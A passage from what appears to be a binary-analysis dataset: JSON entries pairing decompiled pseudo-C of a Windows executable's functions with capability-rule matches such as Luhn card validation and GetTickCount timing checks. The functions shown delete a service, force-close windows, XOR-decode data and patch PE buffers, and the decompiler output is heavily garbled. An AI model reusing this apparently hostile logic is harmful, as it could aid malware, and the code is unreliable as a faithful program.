            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00402660(int32_t *hWnd)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint *in_FS_OFFSET;\n    uint var_24ch;\n    uchar var_148h;\n    uint var_147h;\n    int32_t hLibModule;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t pbstr;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    uint lpdwResult;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x4050c0;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    (*_sym.imp.ole32.dll_CoInitialize)(0);\n    hLibModule = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x411648);\n    if (hLibModule == 0) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    uVar1 = (*_sym.imp.USER32.dll_RegisterWindowMessageA)(0x411654);\n    (*_sym.imp.USER32.dll_SendMessageTimeoutA)(hWnd, uVar1, 0, 0, 2, 1000, &lpdwResult);\n    pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(hLibModule, 0x68);\n    if (pcVar2 == NULL) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_20h = NULL;\n    var_4h = 0;\n    iVar3 = (*pcVar2)(lpdwResult, str._D_3, 0, 0xdc);\n    if ((iVar3 < 0) || (var_20h == NULL)) {\n        var_4h = 0xffffffff;\n        if (var_20h != NULL) {\n            (**(*var_20h + 8))(var_20h);\n        }\n    }\n    else {\n        var_24h = NULL;\n        var_4h._0_1_ = 1;\n        iVar3 = (**(*var_20h + 0x20))(var_20h, &var_24h);\n        if ((-1 < iVar3) && (var_24h != NULL)) {\n            var_1ch = 0;\n            (**(*var_24h + 0x24))(var_24h, &var_1ch);\n            var_40h = 0;\n            if (0 < var_1ch) {\n                do {\n                    var_2ch = (*_sym.imp.MSVCRT.dll_rand)();\n                    var_2ch = var_2ch % var_1ch;\n                    var_34h = CONCAT22(var_34h._2_2_, 3);\n                    hWnd = NULL;\n                    var_10h = NULL;\n                    var_4h._0_1_ = 4;\n                    iVar3 = (**(*var_24h + 0x2c))\n                                      (var_24h, var_34h, var_30h, var_2ch, var_28h, var_34h, var_30h, var_2ch, var_28h, \n                                       &hWnd);\n                    if ((iVar3 < 0) || (hWnd == NULL)) {\n                        var_4h._0_1_ = 3;\n                        if (var_10h != NULL) {\n                            (**(*var_10h + 8))(var_10h);\n                        }\njoined_r0x00402a97:\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*hWnd + 8))(hWnd);\n                        }\ncode_r0x00402aa3:\n                        (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                        break;\n                    }\n                    iVar3 = (***hWnd)(hWnd, 0x4061b0, &var_10h);\n                    if (((iVar3 < 0) || (var_10h == NULL)) ||\n                       (iVar3 = (**(*var_10h + 0x38))(var_10h, &pbstr),  iVar3 < 0)) {\njoined_r0x00402a5e:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                        goto code_r0x00402aa3;\n                    }\n                    if (pbstr == 0) {\njoined_r0x0040289a:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    else {\n                        fcn.00402480(pbstr, &var_24ch, 0x104);\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)(pbstr);\n                        iVar4 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_24ch, 0x41167c);\n                        if (iVar4 != 0) goto joined_r0x0040289a;\n                        var_14h = NULL;\n                        var_4h._0_1_ = 5;\n                        iVar3 = (***hWnd)(hWnd, 0x4061a0, &var_14h);\n                        if ((iVar3 < 0) || (var_14h == NULL)) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\njoined_r0x00402a43:\n                            if (var_10h != NULL) {\n                                var_4h._0_1_ = 3;\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                            goto joined_r0x00402a97;\n                        }\n                        iVar3 = (**(*var_14h + 0x20))(var_14h, &var_3ch);\n                        iVar4 = var_3ch;\n                        if (iVar3 < 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            goto joined_r0x00402a43;\n                        }\n                        if (var_3ch == 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        else {\n                            var_148h = 0;\n                            puVar6 = &var_147h;\n                            for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n                                *puVar6 = 0;\n                                puVar6 = puVar6 + 1;\n                            }\n                            *puVar6 = 0;\n                            *(puVar6 + 2) = 0;\n                            fcn.00402480(iVar4, &var_148h, 0x104);\n                            (*_sym.imp.OLEAUT32.dll_SysStringLen)(var_3ch);\n                            iVar4 = fcn.004025a0(&var_148h);\n                            if (iVar4 == 0) {\n                                (*_sym.imp.KERNEL32.dll_Sleep)(10);\n                                (**(*var_10h + 0x114))(var_10h);\n                                var_4h._0_1_ = 4;\n                                if (var_14h != NULL) {\n                                    (**(*var_14h + 8))(var_14h);\n                                }\n                                goto joined_r0x00402a5e;\n                            }\n                            (*_sym.imp.KERNEL32.dll_Sleep)(0);\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                    var_40h = var_40h + 1;\n                } while (var_40h < var_1ch);\n            }\n        }\n        if (var_24h != NULL) {\n            var_4h = var_4h._1_3_ << 8;\n            (**(*var_24h + 8))(var_24h);\n        }\n        var_4h = 0xffffffff;\n        if (var_20h != NULL) {\n            (**(*var_20h + 8))(var_20h);\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_FreeLibrary)(hLibModule);\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    *in_FS_OFFSET = var_ch;\n    return iVar3;\n}\n",
        "token_count": 2335
    },
    "null": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00402ba0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402bb5) overlaps instruction at (ram,0x00402bb3)\n// \n// WARNING: Removing unreachable block (ram,0x00402c46)\n\nuint __fastcall fcn.00402ba0(uint param_1, uchar *param_2, uchar *param_3)\n\n{\n    int32_t iVar1;\n    ushort extraout_DX;\n    uchar *puVar2;\n    uchar *unaff_ESI;\n    uchar *puVar3;\n    uint *puVar4;\n    bool bVar5;\n    uchar auStack268 [260];\n    uchar auStack8 [4];\n    \n    puVar2 = &stack0xfffffffc;\n    if ((&stack0xfffffffc < 0x108) || (SBORROW4(&stack0xfffffffc, 0x108) == auStack268 < 0)) {\n        param_2 = auStack8;\n        unaff_ESI = param_3;\n    }\n    else {\n        puVar2 = &stack0xfffffffd;\n    }\n    (*_sym.imp.USER32.dll_GetWindowThreadProcessId)(unaff_ESI, param_2);\n    if (*(puVar2 + 0xc) != *(puVar2 + -4)) {\n        return 1;\n    }\n    bVar5 = true;\n    puVar2[-0x108] = 0;\n    puVar4 = puVar2 + -0x107;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    (*_sym.imp.USER32.dll_GetClassNameA)(unaff_ESI, puVar2 + -0x108, 0x104);\n    puVar3 = unaff_ESI;\n    if ((!bVar5) && (bVar5)) {\n        puVar3 = unaff_ESI + 1;\n        out(*unaff_ESI, extraout_DX);\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(puVar2 + -0x108, 0x411624);\n    if (iVar1 == 0) {\n        (*_sym.imp.USER32.dll_EnumChildWindows)(puVar3, 0x402b20, 0);\n        iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n        (*_sym.imp.KERNEL32.dll_Sleep)((iVar1 % 10 + 4) * 1000);\n        (*_sym.imp.USER32.dll_PostMessageA)(puVar3, 0x10, 0, 0);\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 617
    },
    "00402fa0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402fdc) overlaps instruction at (ram,0x00402fd3)\n// \n\nvoid __cdecl fcn.00402fa0(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    bool bVar3;\n    \n    uVar1 = 0;\n    bVar2 = false;\n    bVar3 = arg_14h == 0;\n    if (0 < arg_14h) {\n        do {\n            if ((!bVar2 && !bVar3) && (bVar2 || bVar3)) {\n                bVar2 = false;\n            }\n            if ((!bVar2) && (bVar2)) {\n                *(uVar1 + 0x43d1773a) = *(uVar1 + 0x43d1773a) ^ 0x8b27e95e;\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            *(uVar1 + arg_10h) = arg_14h ^ *(uVar1 + arg_10h) ^ *(uVar1 % arg_ch + arg_8h);\n            uVar1 = uVar1 + 1;\n            bVar2 = uVar1 < arg_14h;\n            bVar3 = uVar1 == arg_14h;\n        } while (uVar1 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 352
    },
    "00403440": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403454) overlaps instruction at (ram,0x00403452)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __fastcall fcn.00403440(int32_t param_1, char param_2, int32_t param_3, int32_t param_4)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint8_t extraout_DH;\n    int32_t *unaff_EDI;\n    bool bVar3;\n    bool bVar4;\n    bool in_SF;\n    \n    if ((in_SF) || (!in_SF)) {\n        in_EAX = param_4;\n        param_1 = param_3;\n    }\n    *(in_EAX + -0x74f3ba76) = *(in_EAX + -0x74f3ba76) | param_1 >> 8;\n    *unaff_EDI = *unaff_EDI + param_1;\n    *(in_EAX + -0x74f3ba24) = *(in_EAX + -0x74f3ba24) + param_2;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)();\n    if (iVar1 != 0) {\n        bVar3 = extraout_DH < 0x36;\n        bVar4 = extraout_DH == 0x36;\n        uVar2 = (*_sym.imp.ADVAPI32.dll_DeleteService)(iVar1);\n        if ((!bVar3 && !bVar4) && (bVar3 || bVar4)) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n        return uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 410
    },
    "00403500": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get common file path"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004035e0) overlaps instruction at (ram,0x004035df)\n// \n// WARNING: Removing unreachable block (ram,0x004035dd)\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00403500(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar lpBuffer;\n    uint var_20fh;\n    uint s;\n    uint var_8h;\n    uint var_4h;\n    \n    lpBuffer = 0;\n    s._0_1_ = 0;\n    puVar2 = &var_20fh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    puVar2 = &s + 1;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x1274, *0x10 + -0x214, arg_8h);\n    fcn.00404cb0(&var_4h, &var_8h);\n    fcn.00403600(var_4h);\n    iVar1 = fcn.00402120(*0x10 + -0x110, var_4h, var_8h);\n    if (iVar1 != 0) {\n    // WARNING: Bad instruction - Truncating control flow here\n        fcn.004012b0(&s, 0xffffffff);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 484
    },
    "00403600": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403678) overlaps instruction at (ram,0x00403677)\n// \n// WARNING: Control flow encountered bad instruction data\n\nint64_t __cdecl fcn.00403600(int16_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    unkbyte3 Var2;\n    code *pcVar3;\n    char cVar7;\n    int32_t *piVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint32_t uVar8;\n    int16_t *extraout_ECX;\n    uint32_t in_EDX;\n    char *pcVar9;\n    uint extraout_EDX;\n    uint32_t uVar10;\n    uchar *puVar11;\n    uint *unaff_ESI;\n    uint32_t uVar12;\n    uint *puVar13;\n    uint *unaff_EDI;\n    uint *puVar14;\n    bool bVar15;\n    uint8_t in_AF;\n    bool bVar16;\n    bool bVar17;\n    ulong uVar18;\n    uint *puStack24187;\n    uint *puStack24183;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar6 = &stack0xfffffffc;\n    uVar10 = (in_EDX >> 8 & 0xffff00) << 8 | in_EDX & 0xffff;\n    if (*arg_8h != 0x5a4d) {\n        return uVar10 << 0x20;\n    }\n    piVar4 = *(arg_8h + 0x1e) + arg_8h;\n    puVar11 = &stack0xfffffffc;\n    if ((piVar4 != NULL) && (puVar11 = &stack0xfffffffc,  piVar4 == NULL)) {\n        puVar13 = &stack0xffffffe4;\n        puVar11 = &stack0xffffffe4;\n        cVar7 = '\\x10';\n        do {\n            puVar6 = puVar6 + -1;\n            puVar13 = puVar13 + -1;\n            *puVar13 = *puVar6;\n            cVar7 = cVar7 + -1;\n        } while ('\\0' < cVar7);\n    }\n    if (*piVar4 != 0x4550) {\n        return uVar10 << 0x20;\n    }\n    if ((SBORROW4(*piVar4, 0x4550)) || (!SBORROW4(*piVar4, 0x4550))) {\n        pcVar9 = piVar4[0x16];\n        if (pcVar9 == NULL) {\n            uVar10 = 0x40;\n            *(puVar11 + -4) = 0x40;\n            bVar15 = (POPCOUNT(unaff_ESI & piVar4 & 0xff) & 1U) != 0;\n            if ((bVar15) && (!bVar15)) {\n                out(*unaff_ESI, 0);\n                goto code_r0x004036a4;\n            }\n            while( true ) {\n                if (*(arg_8h + 0x1e) < 0x81) goto code_r0x004036bb;\n                uVar12 = *(arg_8h + 0x1e);\n                bVar15 = uVar12 < 0xc0;\n                bVar17 = SBORROW4(uVar12, 0xc0);\n                bVar16 = uVar12 == 0xc0;\n                uVar8 = uVar12;\n                if (bVar15) {\n                    bVar17 = SCARRY4(uVar12, -0x80);\n                    uVar8 = uVar12 - 0x80;\n                    bVar16 = uVar8 == 0;\n                    *(puVar11 + -4) = uVar8;\n                    uVar10 = uVar8;\n                }\n                if ((bVar15 && 0x7f < uVar12 || bVar16) || ((!bVar15 || 0x7f >= uVar12) && !bVar16)) break;\n                if (!bVar17) {\n                    return;\n                }\n                arg_8h = uVar8 + 1;\n            }\n            uVar18 = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_(uVar10);\n            pcVar3 = _sym.imp.MSVCRT.dll_rand;\n            pcVar9 = uVar18 >> 0x20;\n            puVar6 = uVar18;\n            *(puVar11 + -8) = puVar6;\n            bVar15 = puVar6 == NULL;\n            if (bVar15) {\n                return ZEXT48(pcVar9) << 0x20;\n            }\n            if ((puVar6 < 1) || (0 < puVar6)) {\n                uVar12 = 0;\n                if (uVar10 != 0) {\n                    do {\n                        iVar5 = (*pcVar3)();\n                        puVar6 = *(puVar11 + -8);\n                        uVar8 = uVar12 + 1;\n                        *(uVar12 + puVar6) = iVar5 % 0xff;\n                        uVar12 = uVar8;\n                    } while (uVar8 < uVar10);\n                }\n                uVar10 = *(puVar11 + -4);\n                puVar13 = puVar6;\n                puVar14 = *(puVar11 + 8) + 0x80;\n                for (uVar12 = uVar10 >> 2; uVar12 != 0; uVar12 = uVar12 - 1) {\n                    *puVar14 = *puVar13;\n                    puVar13 = puVar13 + 1;\n                    puVar14 = puVar14 + 1;\n                }\n                uVar12 = uVar10 & 3;\n                bVar15 = uVar12 != 0;\n                for (; uVar12 != 0; uVar12 = uVar12 - 1) {\n                    *puVar14 = *puVar13;\n                    puVar13 = puVar13 + 1;\n                    puVar14 = puVar14 + 1;\n                }\n                if ((bVar15) && (!bVar15)) {\n                    puVar6 = puVar6 & 0xffffff00 | *0x4bb148d3;\n                    out(*puVar13, uVar10);\n                }\n                sub.MSVCRT.dll_void___cdecl_operator_delete_void__(puVar6);\n                return CONCAT44(extraout_EDX, 1);\n            }\n            in_AF = 9 < (uVar18 & 0xf) | in_AF;\n            Var2 = CONCAT21(uVar18 >> 0x10, (uVar18 >> 8) + in_AF);\n            arg_8h = extraout_ECX;\n            if (extraout_ECX != NULL) {\n                do {\n    // WARNING: Do nothing block with infinite loop\n                } while( true );\n            }\n            while( true ) {\n                piVar4 = CONCAT31(Var2, -in_AF);\n                if (!in_AF && !bVar15) break;\ncode_r0x004036a4:\n                cVar7 = piVar4 >> 8;\n                bVar15 = cVar7 == *pcVar9;\n                in_AF = 9 < (piVar4 & 0xf) | in_AF;\n                Var2 = CONCAT21(piVar4 >> 0x10, cVar7 - in_AF);\n            }\n            piVar1 = unaff_EDI + pcVar9 * 2;\n            *piVar1 = (*piVar1 + 0x7b) - in_AF;\n            iVar5 = *piVar1;\n            *(arg_8h + -0x7f) = piVar4;\n            cVar7 = pcVar9 >> 8;\n            if (-1 < iVar5) {\n                *piVar4 = *piVar4 + -in_AF;\n                *(piVar4 + -0x46) = *(piVar4 + -0x46) + cVar7;\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            *piVar4 = *piVar4;\n            *(unaff_EDI + 9) = *(unaff_EDI + 9) + cVar7;\ncode_r0x004036bb:\n            return ZEXT48(pcVar9) << 0x20;\n        }\n        piVar4 = NULL;\n        unaff_ESI = puStack24183;\n        unaff_EDI = puStack24187;\n    }\n    *unaff_EDI = *unaff_ESI;\n    pcVar9 = arg_8h * 2 + 0x33;\n    *pcVar9 = *pcVar9 << (arg_8h & 0x1f);\n    *(unaff_EDI + 0x62) = *(unaff_EDI + 0x62);\n    return CONCAT44(0x8558508b, piVar4 + 1);\n}\n",
        "token_count": 1979
    },
    "004037c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040390d) overlaps instruction at (ram,0x0040390b)\n// \n// WARNING: Removing unreachable block (ram,0x00403814)\n// WARNING: Removing unreachable block (ram,0x00403822)\n// WARNING: Removing unreachable block (ram,0x0040381e)\n// WARNING: Removing unreachable block (ram,0x004038a5)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint32_t * __fastcall fcn.004037c0(int32_t param_1, uint32_t *param_2, uint32_t *param_3, uint *param_4)\n\n{\n    uint8_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    char cVar5;\n    int32_t iVar6;\n    uint32_t *puVar7;\n    uint extraout_EDX;\n    uint8_t uVar8;\n    uint32_t unaff_EBX;\n    uint32_t **ppuVar9;\n    uint32_t **ppuVar10;\n    uint32_t **ppuVar11;\n    uint32_t unaff_ESI;\n    uint32_t *unaff_EDI;\n    uint32_t *puVar12;\n    uint *puVar13;\n    uint16_t in_ES;\n    ushort in_SS;\n    bool bVar14;\n    bool bVar15;\n    bool bVar16;\n    char cVar17;\n    float10 in_ST0;\n    float10 in_ST1;\n    float10 in_ST2;\n    float10 in_ST3;\n    float10 in_ST4;\n    float10 in_ST5;\n    float10 in_ST6;\n    float10 in_ST7;\n    uint32_t unaff_retaddr;\n    uchar uStack108;\n    uint uStack107;\n    uint32_t **ppuStack72;\n    uint arg_ch;\n    uint32_t *puStack4;\n    \n    while( true ) {\n        *param_3 = 0xf7;\n        bVar14 = (param_2 & 0x1200) == 0;\n        *(param_3 + 1) = 0xb1;\n        *(param_3 + 2) = 0xe8;\n        puVar4 = param_3;\n        puVar7 = param_3;\n        ppuVar11 = &puStack4;\n        if ((bVar14) || (ppuVar11 = &puStack4,  !bVar14)) break;\n        param_2 = param_3;\n        if (param_1 != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    do {\n        *(puVar7 + 3) = 0x83;\n        puStack4 = puVar4;\n        uVar8 = unaff_EBX >> 8 ^ 0x16 | puVar4 >> 8;\n        cVar5 = puVar7 >> 8;\n        bVar15 = uVar8 - cVar5 == '\\0';\n        bVar14 = (POPCOUNT(uVar8 - cVar5) & 1U) == 0;\n        *(puVar7 + 1) = 0x9f;\n        ppuVar10 = ppuVar11;\n        if ((!bVar15) && (bVar15)) {\n            ppuStack72 = &puStack4;\n            ppuVar9 = &puStack4;\n            ppuVar10 = &puStack4;\n            puStack4 = ppuVar11;\n            cVar17 = '\\x10';\n            do {\n                ppuVar11 = ppuVar11 + -1;\n                ppuVar9 = ppuVar9 + -1;\n                *ppuVar9 = *ppuVar11;\n                cVar17 = cVar17 + -1;\n            } while ('\\0' < cVar17);\n        }\n        *(puVar7 + 5) = 0x71;\n        if ((bVar15 || uVar8 < cVar5) || (puVar12 = unaff_EDI,  !bVar15 && cVar5 <= uVar8)) {\n            *(puVar7 + 6) = 0xba;\n            uVar3 = unaff_ESI;\n            if ((cVar5 <= uVar8) && (puStack4 = unaff_EDI,  uVar8 < cVar5)) {\n                in_SS = unaff_retaddr;\n                puVar12 = puStack4;\n                goto code_r0x0040387d;\n            }\n        }\n        else {\ncode_r0x0040387d:\n            in_ST0 = in_ST0 - *(ppuVar10 + 0x42c692c9);\n            puStack4 = puStack4 & 0xffff0000 | in_ES;\n            uVar3 = (puVar4 & 0xffff0000 | CONCAT11(0x13, puVar4)) + 0x18107d5f;\n            unaff_retaddr = unaff_retaddr & 0xffff0000 | in_ES;\n            unaff_EDI = (puVar12 | ppuVar10) + 1;\n            *(puVar12 | ppuVar10) = uVar3;\n            puVar7 = 0xbf571900;\n            uVar2 = uVar3 + (uVar3 >> 8) * 'y';\n            puVar4 = uVar3 & 0xffff0000 | uVar2;\n            bVar14 = (POPCOUNT(uVar2) & 1U) == 0;\n            uVar3 = unaff_ESI - 1;\n        }\n        *(puVar7 + 7) = 0x16;\n        ppuVar11 = ppuVar10;\n        unaff_ESI = uVar3;\n        if ((bVar14) || (!bVar14)) goto code_r0x004038c3;\n        unaff_ESI = *unaff_EDI;\n        *unaff_EDI = uVar3;\n        ppuVar11 = ppuVar10 - *(ppuVar10 + 0x5f9dff63);\n        if (-1 < ppuVar11) break;\n        unaff_EBX = CONCAT31(unaff_EBX >> 8, 0x16);\n        *puVar4 = *puVar4 + puVar4;\n    } while( true );\n    bVar14 = false;\n    bVar16 = unaff_ESI < 0;\n    bVar15 = (POPCOUNT(unaff_ESI & 0xff) & 1U) == 0;\n    if (!bVar16) {\n        if (bVar16) goto code_r0x004038e7;\n        uVar8 = unaff_retaddr >> 8;\n        bVar15 = CARRY1(uVar8, *puVar4);\n        unaff_EBX = unaff_retaddr & 0xffff0000 | CONCAT11(uVar8 + *puVar4, unaff_retaddr);\n        puVar1 = unaff_ESI + 0x789e0b42 + puVar4 * 8;\n        bVar14 = 0xf0 < *puVar1 || CARRY1(*puVar1 + 0xf, bVar15);\n        *puVar1 = *puVar1 + 0xf + bVar15;\n        bVar16 = *puVar1 < '\\0';\n        bVar15 = (POPCOUNT(*puVar1) & 1U) == 0;\n        goto code_r0x00403927;\n    }\ncode_r0x004038c3:\n    *(puVar7 + 2) = 0xd;\n    bVar14 = param_1 < puVar7;\n    cVar5 = param_1 - 1;\n    bVar16 = cVar5 < '\\0';\n    bVar15 = (POPCOUNT(cVar5) & 1U) == 0;\n    *(puVar7 + 9) = 0xf1;\n    while( true ) {\n        if (!bVar15) {\ncode_r0x004038e7:\n            if (bVar15) {\n                ppuVar10 = &puStack4;\n                puStack4 = ppuVar11;\n                cVar5 = '\\x1e';\n                do {\n                    ppuVar11 = ppuVar11 + -1;\n                    ppuVar10 = ppuVar10 + -1;\n                    *ppuVar10 = *ppuVar11;\n                    cVar5 = cVar5 + -1;\n                } while ('\\0' < cVar5);\n                puVar4 = in(0x78);\n                return puVar4;\n            }\n        }\n        *(puVar7 + 10) = 0x17;\n        if ((!bVar15) && (bVar15)) break;\n        *(puVar7 + 0xb) = 0x9e;\n        if (!bVar16) {\ncode_r0x00403927:\n            if (bVar16) {\n                puVar12 = unaff_EDI + 1;\n                puVar1 = unaff_ESI + 4;\n                *(unaff_EDI + 7) = in_ST0;\n                unaff_EDI = unaff_EDI + 5;\n                unaff_ESI = unaff_ESI + 5;\n                bVar14 = *puVar1 < *puVar12;\n                cVar5 = *puVar1 - *puVar12;\n                bVar16 = cVar5 < '\\0';\n                bVar15 = (POPCOUNT(cVar5) & 1U) == 0;\n                in_ST0 = in_ST1;\n                in_ST1 = in_ST2;\n                in_ST2 = in_ST3;\n                in_ST3 = in_ST4;\n                in_ST4 = in_ST5;\n                in_ST5 = in_ST6;\n                in_ST6 = in_ST7;\n            }\n        }\n        *(puVar7 + 3) = 0xd2;\n        if ((bVar15) || (!bVar15)) goto code_r0x0040395e;\n        ppuVar10 = segment(in_SS, *0x10);\n        puVar4 = *ppuVar10;\n        puVar7 = 0xb7bc9ea5;\n        if (bVar14) goto code_r0x0040397f;\n        if (!bVar15) goto code_r0x00403957;\n    }\ncode_r0x00403910:\n    ppuVar10 = &puStack4;\n    puStack4 = ppuVar11;\n    cVar5 = '\\x1e';\n    do {\n        ppuVar11 = ppuVar11 + -1;\n        ppuVar10 = ppuVar10 + -1;\n        *ppuVar10 = *ppuVar11;\n        cVar5 = cVar5 + -1;\n    } while ('\\0' < cVar5);\n    puVar4 = in(0x78);\n    return puVar4;\ncode_r0x00403957:\n    bVar14 = false;\n    bVar15 = (POPCOUNT(&param_3 & 0xff) & 1U) == 0;\n    puVar4 = puVar4;\ncode_r0x0040395e:\n    *(puVar7 + 0xd) = 0xcf;\n    if ((!bVar15) && (bVar15)) {\n        ppuVar10 = segment(in_SS, *0x10);\n        puVar4 = *ppuVar10;\n        if (bVar14) {\n            arg_ch = 0;\n            uStack108 = 0;\n            puVar13 = &uStack107;\n            puStack4 = ppuVar11;\n            for (iVar6 = 0x18; iVar6 != 0; iVar6 = iVar6 + -1) {\n                *puVar13 = 0;\n                puVar13 = puVar13 + 1;\n            }\n            *puVar13 = 0;\n            *(puVar13 + 2) = 0;\n            cVar17 = '\\0';\n            cVar5 = '\\0';\n            bVar14 = (((unaff_EBX ^ unaff_ESI) >> 8) - 1U & 0xd) == 0;\n            fcn.004037c0(&uStack108, &stack0xfffffff8, unaff_EDI, unaff_EBX);\n            if ((!bVar14 && cVar17 == cVar5) && (bVar14 || cVar17 != cVar5)) {\n                arg_ch = extraout_EDX;\n            }\n            puVar4 = fcn.00403350(&uStack108, arg_ch, 0x407020, 0xa240);\n            *param_3 = 0x407020;\n            *param_4 = 0xa240;\n            return puVar4;\n        }\n        if (bVar15) {\n            *(unaff_EBX + 0x11) = in_ST0;\n            goto code_r0x00403910;\n        }\ncode_r0x0040397f:\n        puVar7 = 0xb7bc9ea5;\n        puVar4 = puVar4;\n    }\n    *(puVar7 + 0xe) = 0x3b;\n    puStack4 = puVar4;\n    *ppuVar11[3] = 0xf;\n    return puVar4;\n}\n",
        "token_count": 2953
    },
    "00403de0": {
        "rules": [
